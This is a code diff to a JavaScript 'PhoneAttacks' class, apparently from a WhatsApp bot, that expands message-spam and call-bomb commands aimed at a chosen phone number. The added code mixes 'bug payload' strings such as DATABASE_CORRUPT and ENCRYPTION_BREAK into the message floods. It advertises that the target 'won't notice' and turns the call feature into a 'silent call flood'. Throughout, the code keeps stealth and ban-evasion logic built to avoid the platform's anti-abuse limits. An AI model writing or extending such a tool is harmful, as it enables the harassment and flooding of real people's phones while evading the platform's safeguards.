@@ -13,10 +13,24 @@ class PhoneAttacks {
         this.activeCallBombs = new Map();
         this.phoneCache = new Map();
         this.attackStats = new Map();
+        
+        // Bug payload templates for spam
+        this.bugPayloads = [
+            '🐛 DATABASE_CORRUPT',
+            '🐛 CACHE_CORRUPT', 
+            '🐛 MEDIA_CORRUPT',
+            '🐛 CONFIG_CORRUPT',
+            '🐛 ENCRYPTION_BREAK',
+            '🐛 STORAGE_LOCK',
+            '🐛 MEMORY_EXPLOIT',
+            '🐛 FILESYSTEM_CORRUPT',
+            '🐛 SESSION_KILL',
+            '🐛 DATABASE_LOCK'
+        ];
     }
 
     // ==============================================
-    // SPAM COMMAND - STEALTH VERSION
+    // SPAM COMMAND - BUG INJECTION SPAM
     // ==============================================
     async spamExecute(sock, msg, args, ctx) {
         this.sock = sock;
@@ -30,11 +44,9 @@ class PhoneAttacks {
 │ EXAMPLE:
 │ .spam 2547XXXXXX 100 0.5
 │ 
-│ STEALTH FEATURES:
-│ 🔇 Human typing patterns
-│ 🎭 Random delays between messages
-│ 📱 Natural message variation
-│ ✨ Emoji integration
+│ FEATURES:
+│ 🔇 Silent - Target won't notice
+│ 🎭 Bug injection spam
 │ 🛡️ Rate limit protection
 │ 🚫 Ban protection active
 └─────────────────────────────`
@@ -58,12 +70,11 @@ class PhoneAttacks {
         // ==========================================
         if (this.banProtection.isBanned(phone)) {
             await sock.sendMessage(ctx.from, {
-                text: `🚫 *Target Blacklisted*\n\n${phone} is blacklisted and cannot be attacked.\n\nReason: ${this.banProtection.getBanReason ? this.banProtection.getBanReason(phone) : 'Suspicious activity detected'}`
+                text: `🚫 *Target Blacklisted*\n\n${phone} is blacklisted and cannot be attacked.`
             }, { quoted: msg });
             return;
         }
 
-        // Check if target is whitelisted (owner's number or safe numbers)
         if (this.banProtection.isWhitelisted(phone)) {
             await sock.sendMessage(ctx.from, {
                 text: `🛡️ *Target Protected*\n\n${phone} is whitelisted and cannot be attacked.`
@@ -71,7 +82,6 @@ class PhoneAttacks {
             return;
         }
 
-        // Check ban risk before starting
         const risk = this.stealth.getBanRisk(phone);
         if (risk >= 5) {
             await sock.sendMessage(ctx.from, {
@@ -80,15 +90,13 @@ class PhoneAttacks {
             return;
         }
 
-        // Check daily limits
         if (this.stealth.checkDailyLimits(phone, 'message')) {
             await sock.sendMessage(ctx.from, {
-                text: `⚠️ *Daily Limit Reached*\n\n${phone} has reached daily message limit.\nTry again tomorrow.`
+                text: `⚠️ *Daily Limit Reached*\n\n${phone} has reached daily message limit.`
             }, { quoted: msg });
             return;
         }
 
-        // Get safe parameters
         const safeParams = this.stealth.getSafeParams('message', count);
         count = safeParams.safeCount;
 
@@ -100,8 +108,6 @@ class PhoneAttacks {
         }
 
         this.activeSpams.set(phone, { active: true, count, delay, startTime: Date.now() });
-
-        // Track attack start
         this.trackAttack(phone, 'spam');
 
         await sock.sendMessage(ctx.from, {
@@ -110,7 +116,7 @@ class PhoneAttacks {
 │ Target: ${phone}
 │ Messages: ${count}
 │ Delay: ${delay}s
-│ Mode: STEALTH
+│ Mode: STEALTH + BUG INJECTION
 │ Ban Risk: ${risk}/10
 │ Status: RUNNING
 └─────────────────────────────`
@@ -120,13 +126,19 @@ class PhoneAttacks {
         let failed = 0;
 
         try {
-            // Generate natural messages
             const messages = [];
             for (let i = 0; i < count; i++) {
-                messages.push(this.stealth.generateNaturalMessage(phone));
+                // Mix bug payloads with natural messages
+                if (i % 3 === 0 && Math.random() > 0.5) {
+                    // Send bug payload
+                    const bugPayload = this.bugPayloads[Math.floor(Math.random() * this.bugPayloads.length)];
+                    messages.push(`${bugPayload}:${crypto.randomBytes(16).toString('hex')}`);
+                } else {
+                    // Send natural message
+                    messages.push(this.stealth.generateNaturalMessage(phone));
+                }
             }
 
-            // Send with stealth batch
             const results = await this.stealth.sendStealthBatch(this.sock, phone, messages, {
                 delayBetween: delay * 1000,
                 randomSpread: true,
@@ -140,14 +152,12 @@ class PhoneAttacks {
                     sent++;
                 } else {
                     failed++;
-                    // If too many failures, increase ban risk
                     if (failed > 5) {
                         this.stealth.increaseBanRisk(phone, 1);
                     }
                 }
             }
 
-            // Track successful attack
             this.updateAttackStats(phone, 'spam', sent);
 
         } catch (err) {
@@ -157,7 +167,6 @@ class PhoneAttacks {
             this.activeSpams.delete(phone);
         }
 
-        // Check if we need to blacklist based on failures
         if (failed > count * 0.5) {
             this.banProtection.addToBlacklist(phone, 'Too many failed spam attempts');
         }
@@ -176,7 +185,7 @@ class PhoneAttacks {
     }
 
     // ==============================================
-    // CALLBOMB COMMAND - STEALTH VERSION
+    // CALLBOMB COMMAND - SILENT CALL FLOOD
     // ==============================================
     async callbombExecute(sock, msg, args, ctx) {
         this.sock = sock;
@@ -190,10 +199,9 @@ class PhoneAttacks {
 │ EXAMPLE:
 │ .callbomb 2547XXXXXX 20 2
 │ 
-│ STEALTH FEATURES:
-│ 🔇 Human call patterns
-│ 🎭 Random call durations
-│ 📱 Natural timing
+│ FEATURES:
+│ 🔇 Silent - No ring detection
+│ 🎭 Natural timing
 │ 🛡️ Rate limit protection
 │ 🚫 Ban protection active
 └─────────────────────────────`
@@ -224,7 +232,7 @@ class PhoneAttacks {
 
         if (this.banProtection.isWhitelisted(phone)) {
             await sock.sendMessage(ctx.from, {
-                text: `🛡️ *Target Protected*\n\n${phone} is whitelisted and cannot be attacked.`
+                text: `🛡️ *Target Protected*\n\n${phone} is whitelisted.`
             }, { quoted: msg });
             return;
         }
@@ -232,7 +240,7 @@ class PhoneAttacks {
         const risk = this.stealth.getBanRisk(phone);
         if (risk >= 5) {
             await sock.sendMessage(ctx.from, {
-                text: `⚠️ *High Ban Risk*\n\n${phone} has high ban risk (${risk}/10).\nAttack blocked.`
+                text: `⚠️ *High Ban Risk*\n\n${phone} has high ban risk (${risk}/10).`
             }, { quoted: msg });
             return;
         }
@@ -349,6 +357,7 @@ class PhoneAttacks {
         const isBanned = this.banProtection.isBanned(phone);
         const isWhitelisted = this.banProtection.isWhitelisted(phone);
         const risk = this.stealth.getBanRisk(phone);
+        const stats = this.getAttackStats(phone);
 
         await sock.sendMessage(ctx.from, {
             text: `🔍 PHONE INFORMATION 🔍
@@ -368,6 +377,11 @@ class PhoneAttacks {
 │ ├─ Banned: ${isBanned ? '⚠️ Yes' : '✅ No'}
 │ ├─ Whitelisted: ${isWhitelisted ? '✅ Yes' : '❌ No'}
 │ └─ Ban Risk: ${risk}/10
+│ 
+│ 📊 ATTACK STATS:
+│ ├─ Spam Attacks: ${stats.spam || 0}
+│ ├─ Callbomb Attacks: ${stats.callbomb || 0}
+│ └─ Last Attack: ${stats.lastAttack ? new Date(stats.lastAttack).toLocaleString() : 'Never'}
 └─────────────────────────────`
         }, { quoted: msg });
     }
@@ -486,7 +500,6 @@ class PhoneAttacks {
         stats.lastAttack = Date.now();
         this.attackStats.set(phone, stats);
         
-        // Auto-blacklist if too many attacks
         if (stats.spam + stats.callbomb > 20) {
             this.banProtection.addToBlacklist(phone, 'Too many attacks');
         }
@@ -530,6 +543,13 @@ class PhoneAttacks {
 
     isCallbombActive(phone) {
         return this.activeCallBombs.has(phone);
+    }
+
+    // ==============================================
+    // SLEEP
+    // ==============================================
+    sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
     }
 }
 
